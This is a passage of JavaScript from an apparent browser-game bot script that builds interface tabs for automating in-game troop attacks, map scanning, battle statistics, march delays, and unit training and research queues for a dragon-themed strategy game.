            function onMapChoice(a) {
                var t = Tabs.Attacks;
                if (Data.options.attacks.enabled) {
                    clearTimeout(tick_timer);
                    t.setAttackEnable(false);
                    t.dispFeedback(translate("Safe Mode") + ": " + translate("Attacks") + " " + translate("Disabled"))
                }
                var b = a.target;
                Data.options.map.selected = Tabs.Attacks.selected_map = b.options[b.selectedIndex].value;
                onChangeConfig()
            }
            function onChangeLevelEnable(a) {
                var b = parseInt(a.target.getAttribute("ref"));
                Data.options.attacks.level_enable[b] = a.target.checked;
                a.target.parentNode.style.background = (a.target.checked ? "#2A7" : "none");
                onChangeConfig()
            }
            function onChangeUnits(a) {
                var b = a.target.getAttribute("ref").split("_");
                var x = parseIntZero(a.target.value);
                if (isNaN(x) || x < 0 || x > 200000) {
                    a.target.style.backgroundColor = "#faa";
                    dialogError(translate("Invalid number of troops", t.container))
                } else {
                    a.target.value = x;
                    Data.options.attacks.units[b[0]][t.units_type[b[1]]] = x;
                    a.target.style.backgroundColor = "";
                    if (parseInt(a.target.value) > 0) {
                        a.target.style.color = "#000"
                    }
                }
            }
            function onChangeDragons(a) {
                var b = a.target.getAttribute("ref").split("_");
                Data.options.attacks.units[b[0]][t.dragons_type[b[1]]] = (a.target.checked ? 1 : 0)
            }
            function onChangeConfig() {
                var t = Tabs.Attacks;
                var a = t.getActiveObjectList();
                $J("#" + UID.tabAttack_Title).html(translate("Attack") + " " + translate(Data.options.map.selected));
                $J("#" + UID.tabAttackLevels_Title).html(translate("Attacks") + "&nbsp;" + translate(Data.options.map.selected));
                $J("#" + UID.tabAttackLevels_TargetsInfo).html(translate("Targets") + ":&nbsp;<b>" + a.length + "</b>&nbsp;" + translate("of") + "&nbsp;<b>" + Data.map.terrains[Data.options.map.selected].length + "</b>")
            }
        },
        filter_targets: "",
        tabAttackTarget: function () {
            var t = Tabs.Attacks;
            t.checkMapData();
            var f = t.getActiveObjectList();
            if (f.length === 0) {
                t.dispFeedback(translate("Use the Levels Tab to select attack areas"))
            }
            f.sort(function (a, b) {
                return a.d - b.d
            });
            $J("#" + UID.tabAttack_Title).html(translate("Attack") + " " + translate(Data.options.map.selected));
            $J("#" + UID.tabAttack_Content).html("<div id=" + setUID("tabAttackTarget_Content") + "></div>");
            var g = "<div class=" + UID.title + ">" + translate("Attacks") + "&nbsp;" + translate(Data.options.map.selected) + "</div>";
            setUID("tabAttackTarget_MapChoice");
            g += "<table><tr><td align=right>&nbsp;<b>" + translate("Type") + " " + translate("of") + " " + translate("Targets") + "</b></td><td>&nbsp;:<select id=" + UID.tabAttackTarget_MapChoice + ">";
            for (var h in Data.map.terrains) {
                if (h === "City") {
                    g += '<option disabled="disabled">---------------------</option>'
                }
                g += '<option value="' + h + '" ' + (h === Data.options.map.selected ? "selected" : "") + ">" + translate(h) + "</option>"
            }
            var j = [];
            for (var i = 1; i < Data.options.attacks.level_dist.length; i++) {
                if (Data.options.attacks.level_enable[i]) {
                    j.push(Data.options.attacks.level_dist[i])
                }
            }
            j.sort(function (a, b) {
                return a - b
            });
            var k = (j.first() !== j.last()) ? j.first() + " - " + j.last() : j[0];
            var l = Data.options.map.selected;
            var m = (/(City|Outpost|Wildernesses)/.test(l));
            var o = (l === "Wildernesses");
            g += "</select>&nbsp;</td>";
            if (m) {
                g += "<td>" + translate("Filter") + ":&nbsp;</td><td><input type=text size=20 id=" + setUID("tabAttackTarget_Filter") + ' value="' + t.filter_targets + '" /></td>'
            }
            g += "</tr><tr><td colspan=2><span class=jewel>" + f.length + " " + translate("of") + " " + Data.map.terrains[Data.options.map.selected].length + " (" + translate("Distance") + " " + translate("Max") + ": " + k + ')</span></td></tr></table><div class="' + UID.scrollable + '" style="height:370px;"><table id=' + setUID("tabAttackTarget_Tab") + " class=" + UID.table + "><tr><th>" + translate("Distance").substring(0, 4) + "</th><th>" + translate("Coordinates").substring(0, 5) + "</th>" + (o ? "<th>" + translate("Type") + "</th>" : "") + "<th>" + translate("Level").substring(0, 3) + "</th><th>" + translate("Last Attack").split(" ").join("<br/>") + "</th><td></td>";
            if (m) {
                g += "<th>" + translate("Name") + "</th><th>" + translate("Alliance") + "</th>"
            }
            g += +"</tr>";
            for (var i = 0; i < f.length; i++) {
                var p = Data.map.coords[f[i].x + "," + f[i].y];
                var q = (Data.map.terrains[Map.names[p.t]])[p.n];
                g += "<tr id=" + setUID("tabAttackTarget_TabRow_" + i);
                if (q.pN) {
                    g += '  title="' + (q.n || " ") + "  (" + translate(Map.names[(o ? p._t : q.t)]) + ") \n" + q.pN + " (lvl " + q.pL + ") - Pwr: " + q.pM + " \n" + translate("Alliance") + ": " + (q.aN || "---") + '"'
                }
                g += "><td>" + f[i].d + "</td><td align=center>" + f[i].x + "/" + f[i].y + "</td>" + (o ? "<td align=center>" + translate(Map.names[p._t]).substring(0, 3) + "</td>" : "") + "<td align=center>" + f[i].l + "</td><td><span id=" + setUID("tabAttackTarget_lastAttack_" + i) + "> --- </span></td><td><input id=" + setUID("tabAttackTarget_AttackNow_" + i) + " ref=" + i + ' class=thin type=button value=" ' + translate("Attack") + '! " />';
                if (q.pN) {
                    g += "&nbsp;<input id=" + setUID("tabAttackTarget_SkipAttack_" + i) + " ref=" + i + " type=checkbox " + (q.at ? "checked" : "") + " /></td><td><b>" + q.pN.truncate(13).replace("...", "<span class=jewel>..</span>") + "</b></td>" + (o ? "<td><span class=jewel>" + (q.aN || "-----").truncate(16).replace("...", "..</span>") : "<td>" + (q.aN || "-----").truncate(16).replace("...", ".."))
                }
                g += "</td></tr>"
            }
            g += "</table></div>";
            var s = $J("#" + UID.tabAttackTarget_Content);
            s.html(g);
            s.css("height", s.parent().innerHeight() - 5 + "px");
            $J("#" + UID.tabAttackTarget_MapChoice).change(onMapChoice);
            $J("#" + UID.tabAttackTarget_Filter).keypress(function (a) {
                if (a.which === 13) {
                    if (Data.options.attacks.enabled) {
                        clearTimeout(tick_timer);
                        t.setAttackEnable(false);
                        t.dispFeedback(translate("Safe Mode") + ": " + translate("Attacks") + " " + translate("Disabled"))
                    }
                    t.filter_targets = $J(this).val();
                    t.tabAttackTarget()
                }
            });
            for (var i = 0; i < f.length; i++) {
                var u = $id(UID["tabAttackTarget_AttackNow_" + i]);
                if (!u) {
                    continue
                }
                $J(u).click(butAttackNow);
                if ($J("#" + UID["tabAttackTarget_SkipAttack_" + i])) {
                    $J("#" + UID["tabAttackTarget_SkipAttack_" + i]).click(toggleAttackable)
                }
                setButtonStyle(u, f[i].at)
            }
            function setButtonStyle(a, b) {
                if (b) {
                    a.disabled = false;
                    $J(a).removeClass(UID.bnt_red);
                    $J(a).addClass(UID.bnt_green)
                } else {
                    a.disabled = true;
                    $J(a).removeClass(UID.bnt_green);
                    $J(a).addClass(UID.bnt_red)
                }
            }
            function onMapChoice(a) {
                var t = Tabs.Attacks;
                if (Data.options.attacks.enabled) {
                    clearTimeout(tick_timer);
                    t.setAttackEnable(false);
                    t.dispFeedback(translate("Safe Mode") + ": " + translate("Attacks") + " " + translate("Disabled"))
                }
                var b = a.target;
                Data.options.map.selected = Tabs.Attacks.selected_map = b.options[b.selectedIndex].value;
                t.tabAttackTarget()
            }
            function butAttackNow(a) {
                var n = parseInt(a.target.getAttribute("ref"));
                $J.msg({
                    content: translate("Attacking") + "...",
                    target: t.container
                });
                t.checkAttack(f[n], notify);

                function notify(r) {
                    if (r !== null) {}
                }
            }
            function toggleAttackable(a) {
                var n = parseInt(a.target.getAttribute("ref"));
                f[n].at = a.target.checked;
                setButtonStyle($id(UID["tabAttackTarget_AttackNow_" + n]), f[n].at)
            }
            function tick() {
                var a = serverTime();
                clearTimeout(t.timer_ticks.targets);
                if ($J("#" + UID.tabAttackTarget_Tab).length < 1) {
                    return
                }
                for (var i = 0; i < f.length; i++) {
                    var b = $J("#" + UID["tabAttackTarget_lastAttack_" + i]);
                    if (b.length < 1) {
                        continue
                    }
                    var c = parseInt(f[i].lst);
                    var d = a - c;
                    var e = c ? timeFormat(a - c, false) : "---";
                    if (d > 3600) {
                        e = "<font color=#550000><b>" + e + "</b></font>"
                    }
                    b.html(e)
                }
                t.timer_ticks.targets = setTimeout(tick, 5000)
            }
            tick()
        },
        tabAttackStats: function () {
            var t = Tabs.Attacks;
            var a = "<div class=" + UID.title + ">" + translate("Statistics") + "</div><div id=" + setUID("tabAttackStats_Status") + " class=" + UID.status_ticker + "></div><center><input id=" + setUID("tabAttackStats_Clear") + ' type=button value="' + translate("Delete") + " " + translate("Statistics") + '" /></center>';
            $J("#" + UID.tabAttack_Content).html(a);
            $J("#" + UID.tabAttackStats_Status).css({
                height: $J("#" + UID.tabAttack_Content).innerHeight() - 55 + "px",
                marginBottom: "4px"
            });
            $J("#" + UID.tabAttackStats_Clear).click(function () {
                t.clearStats();
                t.showStats()
            });
            t.showStats()
        },
        clearStats: function () {
            var t = Tabs.Attacks;
            var a = serverTime();
            Data.stats = {
                start_at: a,
                run_time: 0,
                attacks: 0,
                items: {},
                resources: {},
                levels: []
            };
            t.run_start_at = a;
            for (var i = 0; i < 12; i++) {
                Data.stats.levels[i] = {
                    attacks: 0,
                    items: {},
                    resources: {}
                }
            }
            t.showStats()
        },
        trackStats: function (a, r) {
            var t = Tabs.Attacks;
            if (U) {
                debugLog("Tabs.Attacks.trackStats: " + a)
            }
            var b = r.report.location.level;
            if (b < 1 || b > 12) {
                b = 0
            }++Data.stats.attacks;
            ++Data.stats.levels[b].attacks;
            var c = r.report.spoils.resources;
            for (var p in c) {
                objAddTo(Data.stats.resources, p, parseInt(c[p]));
                objAddTo(Data.stats.levels[b].resources, p, parseInt(c[p]))
            }
            var d = r.report.spoils.kill_items;
            for (var p in d) {
                objAddTo(Data.stats.resources, p, parseInt(d[p]));
                objAddTo(Data.stats.levels[b].resources, p, parseInt(d[p]))
            }
            var e = r.report.spoils.items;
            for (var i = 0; i < e.length; i++) {
                objAddTo(Data.stats.items, e[i], 1);
                objAddTo(Data.stats.levels[b].items, e[i], 1)
            }
            Data.marches.attacks[a].has_report = true;
            t.showStats()
        },
        showStats: function () {
            var t = Tabs.Attacks;
            var b = Data.stats.run_time;
            if (Data.options.attacks.enabled) {
                b += (serverTime() - t.run_start_at)
            }
            var c = (b > 0) ? (b / 3600) : 1;
            var d = "<table class=" + UID.table + "><tr><td class=right>" + translate("Start Date") + ": </td><td>" + new Date(Data.stats.start_at * 1000).myString() + "</td></tr><tr><td class=right>" + translate("Run Time") + ": </td><td>" + timeFormat(b, true) + "</td></tr><tr><td class=right>" + translate("Attacks") + ": </td><td>" + Data.stats.attacks + "</td></tr><tr valign=top><td class=right>" + translate("Resources") + ": </td><td><table class=" + UID.table + ">";
            for (var e in Data.stats.resources) {
                var f = Data.stats.resources[e] / c;
                d += "<tr align=right><td>" + translate(e) + ":</td><td>" + Data.stats.resources[e].intToCommas() + "</td><td>(" + f.intToCommas() + " /" + translate("h") + ")</td></tr>"
            }
            d += "</table></td></tr></table>";
            d += "<br><div class=" + UID.subtitle + ">" + translate("Statistics") + "&nbsp;" + translate("of") + "&nbsp;" + translate("Attack") + " " + translate("and") + " " + translate("Items") + '</div><div style="overflow-y:auto;height:200px"><table class=' + UID.table + "><tr class=" + UID.row_top_headers + ' align=center><td style="background:none !important;"></td><td align=right colspan=12>' + translate("Levels") + "</td></tr><tr><td></td>";
            for (i = 1; i < 12; i++) {
                d += "<th width=45>" + i + "</th>"
            }
            d += "</tr><tr><td colspan=12><HR class=thin></td></tr><tr align=right><td class=right># " + translate("Attacks") + ":</td>";
            for (i = 1; i < 12; i++) {
                d += "<td>" + Data.stats.levels[i].attacks + "</td>"
            }
            d += "</tr><tr><td colspan=12><HR class=thin></td></tr>";
            var g = flipStats("items");
            for (var p in g) {
                d += "<tr align=right><td class=right>" + translate(p) + ":</td>";
                for (i = 1; i < 12; i++) {
                    d += "<td>" + g[p][i] + "</td>"
                }
            }
            d += "</tr></table></div>";
            $J("#" + UID.tabAttackStats_Status).html(d);

            function flipStats(a) {
                var o = {};
                for (var i = 1; i < 12; i++) {
                    for (var p in Data.stats.levels[i][a]) {
                        if (!o[p]) {
                            o[p] = [];
                            for (var x = 1; x < 12; x++) {
                                o[p][x] = 0
                            }
                        }
                        o[p][i] += Data.stats.levels[i][a][p]
                    }
                }
                return o
            }
        },
        map_viewer: null,
        map_viewer_dragger: null,
        map_viewer_terrains: {
            AnthropusCamp: {
                enabled: false,
                color: ["0x90", "0xB0", "0x80"]
            },
            Bog: {
                enabled: false,
                color: ["0xC0", "0x70", "0xB0"]
            },
            Forest: {
                enabled: false,
                color: ["0x50", "0xA0", "0x50"]
            },
            Grassland: {
                enabled: false,
                color: ["0x80", "0xC0", "0x50"]
            },
            Hill: {
                enabled: false,
                color: ["0x30", "0xB0", "0x90"]
            },
            Lake: {
                enabled: false,
                color: ["0x50", "0x50", "0xD0"]
            },
            Mountain: {
                enabled: false,
                color: ["0x60", "0xB0", "0xB0"]
            },
            Plain: {
                enabled: false,
                color: ["0xB0", "0xB0", "0x60"]
            },
            City: {
                enabled: true,
                color: ["0xDA", "0xD0", "0xD0"]
            },
            Outpost: {
                enabled: false,
                color: ["0xB0", "0x80", "0x50"]
            },
            Wildernesses: {
                enabled: false,
                color: ["0xC0", "0x70", "0x70"]
            },
        },
        tabAttackMaps: function () {
            var t = Tabs.Attacks;
            var A = "<div class=" + UID.subtitle + ">" + translate("Search") + " " + translate("Location") + '</div><div><br><table><tr><td style="min-width:100px"><b>' + translate("Coordinates") + ":&nbsp;</b>&nbsp;</td><td><b>X:</b> <input id=" + setUID("tabAttackMaps_x") + ' size=3 maxlength=3 type=text value="' + Data.options.map.x + '" /> <b>Y:</b> <input id=' + setUID("tabAttackMaps_y") + ' size=3 maxlength=3 type=text value="' + Data.options.map.y + '" /> </td><td>&nbsp;<input id=' + setUID("tabAttackMaps_View") + ' type=button value="' + translate("View Map") + '" /></td></tr><tr><td colspan=3>&nbsp;</td></tr><tr><td><b>' + translate("Search Radius") + ":</b>&nbsp;</td><td>&nbsp;&nbsp;<select id=" + setUID("tabAttackMaps_Radius") + ">";
            for (var i = 7; i <= 35; i += 7) {
                A += '<option value="' + i + '" ' + (Data.options.map.radius === i ? "selected" : "") + ">" + i + "</option>"
            }
            A += "<select> " + translate("miles") + ".&nbsp;&nbsp;</td><td>&nbsp;<input id=" + setUID("tabAttackMaps_Search") + ' type=button value="' + translate("Search") + '" /></td></tr></table><br><br><table class=' + UID.table + "><tr><th>" + translate("view") + "</th><th>" + translate("type") + "</th><th>" + translate("total") + "</th></tr>";
            for (var B in Data.map.terrains) {
                A += "<tr><td><input type=checkbox id=" + setUID("tabAttackMaps_Show_" + B) + " ref=" + Map.names[B] + " " + (t.map_viewer_terrains[B].enabled ? "CHECKED" : "") + "/></td><td>" + translate(B) + "</td><td align=right><span class=jewel>" + Data.map.terrains[B].length + "</span></td></tr>"
            }
            A += "</table></div>";
            $J("#" + UID.tabAttack_Content).html(A);
            $J("#" + UID.tabAttackMaps_Search).click(startScanMap);
            $J("#" + UID.tabAttackMaps_View).click(setMapViewer);
            $J("#" + UID.tabAttackMaps_Radius).change(function (a) {
                var b = a.target;
                Data.options.map.radius = parseInt(b.options[b.selectedIndex].value);
                if (t.map_viewer_dragger) {
                    var r = Data.options.map.radius;
                    var c = r * 2;
                    t.map_viewer_dragger.width((c - 1) + "px");
                    t.map_viewer_dragger.height((c - 1) + "px");
                    var x = parseInt($J("#" + UID.tabAttackMaps_x).val()) - r;
                    var y = parseInt($J("#" + UID.tabAttackMaps_y).val()) - r;
                    t.map_viewer_dragger.css({
                        left: x + "px",
                        top: y + "px",
                    });
                    var d = $J("#" + UID["map-viewer-dragger-box"] + " > div");
                    if (y < 100) {
                        d.css("margin-top", (r * 2 + 10) + "px")
                    }
                    if (x > 600) {
                        d.css("margin-left", "-" + (r * 2 + 30) + "px")
                    }
                }
            });
            for (var B in Data.map.terrains) {
                $J("#" + UID["tabAttackMaps_Show_" + B]).click(function (a) {
                    var b = Map.names[$J(this).attr("ref")];
                    t.map_viewer_terrains[b].enabled = a.target.checked;
                    if (t.map_viewer && t.map_viewer.isOpen()) {
                        setMapViewer()
                    }
                })
            }
            function startScanMap(d) {
                var e = $J(this);
                e.attr("disabled", true);
                verboseLog("<b>scanMap</b>: Begin...");
                var t = Tabs.Attacks;
                var f = dialogBox({
                    id: setUID("dialog-scanmap"),
                    minWidth: 300,
                    centerTo: t.container,
                    buttons: [],
                    overlay: true,
                    title: "Scanning Map",
                    html: "<center>" + translate("Scanning Map").replace("$NUM$", Data.options.map.radius) + "<br><br><div class=progressbar></div></center>"
                });
                var x = $J("#" + UID.tabAttackMaps_x).val() || Data.options.map.x;
                var y = $J("#" + UID.tabAttackMaps_y).val() || Data.options.map.y;
                var g = Data.options.map.radius;
                Map.scanMap(x, y, g, function (a) {
                    if (a === null) {
                        e.attr("disabled", false);
                        verboseLog("<b>scanMap</b>: there was an <b>error</b> while scanning the map");
                        f.html("<B>" + translate("Bummer, there was an error while scanning the map") + ".</B>");
                        f.centerTo();
                        f.buttons([{
                            text: translate("Ok"),
                            click: function () {
                                f.destroy()
                            }
                        }]);
                        Tabs.Attacks.check_map_busy = false;
                        return
                    }
                    if (a.done) {
                        e.attr("disabled", false);
                        verboseLog("scanMap: complete!");
                        Tabs.Attacks.check_map_busy = false;
                        var b = "<center><br>" + translate("complete") + "!<br><br><table class=" + UID.table + ">"; + "<tr><th>" + translate("type") + "</th><th>" + translate("total") + "</th></tr>";
                        for (var c in a.founds) {
                            b += "<tr><td>" + translate(c) + "&nbsp;</td><td>&nbsp;" + a.founds[c] + "</td></tr>"
                        }
                        b += "</table></center>";
                        f.html(b);
                        f.centerTo();
                        f.buttons([{
                            text: translate("Ok"),
                            click: function () {
                                f.destroy()
                            }
                        }]);
                        f.timeOut("15s");
                        t.tabAttackMaps();
                        if (t.map_viewer && t.map_viewer.isOpen()) {
                            setMapViewer()
                        }
                    } else {
                        if (a.init) {
                            bj.start({
                                target: $J("#" + UID["dialog-scanmap"] + " .progressbar"),
                                steps: Map.steps
                            })
                        } else {
                            bj.update(Map.step)
                        }
                    }
                })
            }
            function setMapViewer(j) {
                if (t.map_viewer === null) {
                    t.map_viewer = dialogBox({
                        id: UID["map-viewer-box"],
                        dialogClass: UID["map-viewer-box"],
                        buttons: {},
                        notdestroy: true,
                        position: [0, 0],
                        width: 752,
                        height: 774,
                        title: translate("View") + " " + translate("Map"),
                        html: '<img height="750" width="750" id=' + setUID("map-viewer-image") + "></img>"
                    });
                    t.map_viewer.option("show", null);
                    t.map_viewer.option("hide", null)
                }
                t.map_viewer.open();
                var k = new PNGlib(750, 750, 256);
                var l = k.color("0x40", "0x50", "0x40");
                var m = k.color("0x60", "0x80", "0x60");
                for (var y = 0; y < 750; y++) {
                    for (var x = 0; x < 750; x++) {
                        var n = Data.map.coords[x + "," + y];
                        var o = k.index(x, y);
                        if (n) {
                            var p = t.map_viewer_terrains[Map.names[n.t]];
                            var c = p.color;
                            k.buffer[o] = p.enabled ? k.color(c[0], c[1], c[2]) : m
                        } else {
                            k.buffer[o] = l
                        }
                    }
                }
                $J("#" + UID["map-viewer-image"]).attr("src", "data:image/png;base64," + k.getBase64());

                function fixCoords(x, y) {
                    var x = x + Data.options.map.radius + 3 - 7;
                    switch (Data.options.map.radius) {
                    case 7:
                        y = y - 14;
                        break;
                    case 14:
                        y = y - 7;
                        break;
                    case 21:
                        y = y + 0;
                        break;
                    case 28:
                        y = y + 7;
                        break;
                    case 35:
                        y = y + 14;
                        break
                    }
                    y = y - 1 - 7;
                    return {
                        x: x,
                        y: y
                    }
                }
                if (t.map_viewer_dragger === null) {
                    t.map_viewer_dragger = $J("<div><div class=jewel></div></div>").attr({
                        id: setUID("map-viewer-dragger-box"),
                        "class": UID["map-viewer-dragger"]
                    }).appendTo($J("#" + UID["map-viewer-box"]));
                    t.map_viewer_dragger.draggable({
                        grid: [7, 7],
                        drag: function (a, b) {
                            var c = $J(a.target).offset();
                            var r = Data.options.map.radius;
                            var d = fixCoords(c.left, c.top);
                            var e = Map.normalize(d.x - r);
                            var f = Map.normalize(d.y - r);
                            var g = Map.normalize(d.x + r);
                            var h = Map.normalize(d.y + r);
                            t.map_viewer_dragger.html("<div class=jewel>" + e + "/" + f + "&nbsp;-&nbsp;" + g + "/" + h + "</div>");
                            var i = $J("#" + UID["map-viewer-dragger-box"] + " > div");
                            if (c.top < 100) {
                                i.css("margin-top", (r * 2 + 10) + "px")
                            }
                            if (c.left > 600) {
                                i.css("margin-left", "-" + (r * 2 + 30) + "px")
                            }
                        },
                        stop: function (a, b) {
                            var c = $J(a.target).offset();
                            var d = fixCoords(c.left, c.top);
                            var x = Map.normalize(d.x);
                            var y = Map.normalize(d.y);
                            $J("#" + UID.tabAttackMaps_x).val(x);
                            $J("#" + UID.tabAttackMaps_y).val(y)
                        }
                    })
                }
                var r = Data.options.map.radius;
                var x = parseInt($J("#" + UID.tabAttackMaps_x).val()) - r;
                var y = parseInt($J("#" + UID.tabAttackMaps_y).val()) - r;
                var q = Map.normalize(x - r);
                var s = Map.normalize(y - r);
                var u = Map.normalize(x + r);
                var v = Map.normalize(y + r);
                var w = r * 2;
                t.map_viewer_dragger.width((w - 1) + "px").height((w - 1) + "px").css({
                    left: x + "px",
                    top: y + "px",
                });
                var z = $J("#" + UID["map-viewer-dragger-box"] + " > div");
                z.html(q + "/" + s + "&nbsp;-&nbsp;" + u + "/" + v);
                if (y < 100) {
                    z.css("margin-top", (r * 2 + 10) + "px")
                }
                if (x > 600) {
                    z.css("margin-left", "-" + (r * 2 + 30) + "px")
                }
            }
        },
        tabAttackConfig: function () {
            var t = Tabs.Attacks;
            var d = "<div class=" + UID.title + ">" + translate("Attacks Configuration") + "</div><div><table class=" + UID.table + "><tr><td class=right>" + translate("Delay Between Attacks") + ":&nbsp;</td><td><input class=short id=" + setUID("tabAttackConfig_DelayMin") + ' maxlength=4 type=text value="' + Data.options.attacks.delay_min + '" />&nbsp;-&nbsp;<input class=short id=' + setUID("tabAttackConfig_DelayMax") + ' maxlength=4 type=text value="' + Data.options.attacks.delay_max + '" />&nbsp;' + translate("Seconds").toLowerCase() + "</td></tr><tr><td class=right>" + translate("Delete") + " " + translate("Battle Report") + ":&nbsp;</td><td><input id=" + setUID("tabAttackConfig_DelAttacks") + " " + (Data.options.attacks.delete_reports ? "CHECKED " : "") + " type=checkbox /></td></tr><tr><td class=right>" + translate("Stop if any troops lost") + ":&nbsp;</td><td><input id=" + setUID("tabAttackConfig_StopOnLoss") + " " + (Data.options.attacks.stop_on_loss ? "CHECKED " : "") + " type=checkbox /></td></tr><tr><td class=right>" + translate("Maximum simultaneous marches") + ":&nbsp;</td><td><input id=" + setUID("tabAttackConfig_MaxMarches") + ' class=short maxlength=2 type=text value="' + Data.options.attacks.max_marches + '" /></td></tr><tr><td class=right>' + translate("Enable") + " " + translate("Attacks Logs") + ":&nbsp;</td><td><input id=" + setUID("tabAttackConfig_LogAttack") + " " + (Data.options.attacks.log_attacks ? "CHECKED " : "") + " type=checkbox /></td></tr><tr><td colspan=2><hr></td></tr><tr><td class=right>" + translate("Dont make Wildernesses of the terrains attacked") + ":&nbsp;</td><td><input id=" + setUID("tabAttackConfig_AbandonWildernesses") + " " + (Data.options.attacks.abandon_wildernesses ? "CHECKED " : "") + " type=checkbox /></td></tr><tr><td class=right>" + translate("Withdraw troops if they are encamped") + ":&nbsp;</td><td><input id=" + setUID("tabAttackConfig_RecallEncamped") + " " + (Data.options.attacks.recall_encamped ? "CHECKED " : "") + " type=checkbox /></td></tr><tr><td colspan=2><hr></td></tr><tr><td class=right>" + translate("Clear last attack on current map") + "&nbsp;</td><td><input id=" + setUID("tabAttackConfig_ClearLast") + '  type=button value="' + translate("Delete") + '" /></td></tr><tr><td class=right>' + translate("Clear last attack on all maps") + "&nbsp;</td><td><input id=" + setUID("tabAttackConfig_ClearAll") + " " + (Data.options.attacks.clear_all_targets ? "CHECKED " : "") + " type=checkbox /></td></tr></table>";
            $J("#" + UID.tabAttack_Content).html(d);
            $J("#" + UID.tabAttackConfig_DelAttacks).change(function (a) {
                Data.options.attacks.delete_reports = a.target.checked
            });
            $J("#" + UID.tabAttackConfig_StopOnLoss).change(function (a) {
                Data.options.attacks.stop_on_loss = a.target.checked
            });
            $J("#" + UID.tabAttackConfig_LogAttack).change(function (a) {
                Data.options.attacks.log_attacks = a.target.checked
            });
            $J("#" + UID.tabAttackConfig_AbandonWildernesses).change(function (a) {
                Data.options.attacks.abandon_wildernesses = a.target.checked
            });
            $J("#" + UID.tabAttackConfig_RecallEncamped).change(function (a) {
                Data.options.attacks.recall_encamped = a.target.checked
            });
            $J("#" + UID.tabAttackConfig_ClearAll).change(function (a) {
                Data.options.attacks.clear_all_targets = a.target.checked
            });
            $J("#" + UID.tabAttackConfig_DelayMin).change(onChangeDelay);
            $J("#" + UID.tabAttackConfig_DelayMax).change(onChangeDelay);
            $J("#" + UID.tabAttackConfig_MaxMarches).change(onChangeMaxMarches);
            $J("#" + UID.tabAttackConfig_ClearLast).click(clearLast);

            function onChangeDelay(a) {
                var b = parseIntNan($id(UID.tabAttackConfig_DelayMin).value);
                var c = parseIntNan($id(UID.tabAttackConfig_DelayMax).value);
                if (b < X || b > 3600 || (c - b) < 30) {
                    $J.msg({
                        content: "<center><h3><b>" + translate("Invalid delays") + "</b></h3><br>" + translate("First value must be between") + "<br>" + X + " " + translate("and") + " 3600 " + translate("Seconds") + " <br>" + translate("Second value must be at least") + "<br> 30 " + translate("above the first value") + "</center>",
                        timeOut: "words",
                        target: t.container
                    });
                    if (b < X) {
                        if (c > b + 30) {
                            b = c - 30
                        } else {
                            b = X;
                            c = b + 30
                        }
                    } else {
                        if (b > 3600) {
                            b = 3600;
                            c = b + 30
                        } else {
                            c = b + 30
                        }
                    }
                    $id(UID.tabAttackConfig_DelayMin).value = b;
                    $id(UID.tabAttackConfig_DelayMax).value = c
                }
                Data.options.attacks.delay_min = b;
                Data.options.attacks.delay_max = c
            }
            function onChangeMaxMarches(a) {
                var b = parseIntNan($id(UID.tabAttackConfig_MaxMarches).value);
                if (b < 0 || b > 12) {
                    a.target.style.backgroundColor = "#faa";
                    return
                }
                a.target.style.backgroundColor = "";
                Data.options.attacks.max_marches = b
            }
            function clearLast(a) {
                if (Data.options.attacks.clear_all_targets) {
                    for (var b in Data.map.terrains) {
                        for (var i = 0; i < Data.map.terrains[b].length; i++) {
                            (Data.map.terrains[b])[i].lst = 0
                        }
                    }
                } else {
                    var c = Data.map.terrains[Data.options.map.selected];
                    for (var i = 0; i < c.length; i++) {
                        c[i].lst = 0
                    }
                }
            }
        }
    };
    Tabs.Jobs = {
        tab_order: J,
        tab_label: "Tasks",
        tab_disabled: !Q,
        last_subtab: "tabJobInfo",
        container: null,
        timer: null,
        train_timer: null,
        train_stat_timer: null,
        train_errors: 0,
        train_retry_time: 20000,
        recheck_train: false,
        build_timer: null,
        build_stat_timer: null,
        build_errors: 0,
        build_retry_time: 20000,
        research_timer: null,
        res_stat_timer: null,
        research_errors: 0,
        res_retry_time: 20000,
        city: {
            0: {
                units_type: ["Porter", "Conscript", "Spy", "Halberdsman", "Minotaur", "Longbowman", "SwiftStrikeDragon", "BattleDragon", "ArmoredTransport", "Giant", "FireMirror"],
            },
            1: {
                units_type: [],
            },
            2: {
                units_type: [],
            },
            3: {
                units_type: [],
            },
            4: {
                units_type: [],
            },
        },
        train_jobs: [],
        research_index: {
            Agriculture: 0,
            Woodcraft: 1,
            Masonry: 2,
            Mining: 3,
            Clairvoyance: 4,
            RapidDeployment: 5,
            Ballistics: 6,
            Metallurgy: 7,
            Medicine: 8,
            Dragonry: 9,
            Levitation: 10,
            Mercantilism: 11,
            AerialCombat: 12
        },
        research_type: ["Agriculture", "Woodcraft", "Masonry", "Mining", "Clairvoyance", "RapidDeployment", "Ballistics", "Metallurgy", "Medicine", "Dragonry", "Levitation", "Mercantilism", "AerialCombat"],
        research_capital: ["Home", "Garrison", "ScienceCenter", "Metalsmith", "OfficerQuarter", "MusterPoint", "Rookery", "StorageVault", "Theater", "Sentinel", "Factory", "Fortress", "DragonKeep", "Wall"],
        research_outpost: ["TrainingCamp", "Home", "Silo", "MusterPoint", "DragonKeep", "Wall"],
        research_field: ["Mine", "Farm", "Lumbermill", "Quarry"],
        research_outpost_spectral: ["Mausoleum", "DarkPortal"],
        research_field_spectral: ["EnergyCollector"],
        content_type: 0,
        train_content_type: 0,
        train_accordion: 0,
        build_accordion: 0,
        init: function (a) {
            var t = Tabs.Jobs;
            for (var b = 1; b < Seed.cities.length; b++) {
                var c = Seed.cities[b];
                if (!c) {
                    continue
                }
                if (t.city[b] === undefined) {
                    t.city[b] = {
                        units_type: []
                    }
                }
                switch (c.outpost_type) {
                case "WaterDragonOutpost":
                    t.city[b].units_type = t.city[0].units_type.concat(["AquaTroop"]);
                    break;
                case "StoneDragonOutpost":
                    t.city[b].units_type = t.city[0].units_type.concat(["StoneTroop"]);
                    break;
                case "FireDragonOutpost":
                    t.city[b].units_type = t.city[0].units_type.concat(["FireTroop"]);
                    break;
                case "WindDragonOutpost":
                    t.city[b].units_type = t.city[0].units_type.concat(["WindTroop"]);
                    break;
                case "SpectralDragonOutpost":
                    t.city[b].units_type = [];
                    t.research_index += {
                        EnergyCollection: 13,
                        WarriorRevival: 14,
                        GuardianRevival: 15
                    };
                    t.research_type[13] = "EnergyCollection";
                    t.research_type[14] = "WarriorRevival";
                    t.research_type[15] = "GuardianRevival";
                    break;
                default:
                    t.city[b].units_type = t.city[0].units_type
                }
            }
            t.units_type = t.city[0].units_type.concat(["AquaTroop", "StoneTroop", "FireTroop", "WindTroop"]);
            for (var b = 0; b < Seed.cities.length; b++) {
